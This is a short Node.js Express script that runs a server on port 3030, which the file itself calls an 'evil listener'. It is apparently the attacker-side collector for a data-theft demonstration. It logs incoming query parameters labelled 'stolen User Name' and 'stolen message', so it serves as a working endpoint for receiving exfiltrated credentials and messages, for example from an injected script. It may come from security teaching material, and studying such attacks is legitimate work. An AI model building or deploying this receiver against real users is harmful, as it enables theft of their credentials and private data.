var express = require('express');
var app = express();

app.get('/', function (req, res) {
   console.log('waiting for a parameter named msg');
    console.log('stolen User Name: ' + req.query.user);
   console.log('stolen message: ' + req.query.msg);
   res.write('I hear you secrets!');
   res.end();
});

app.listen(3030,function(){
   console.log('evil listener at PORT 3030'); 
});
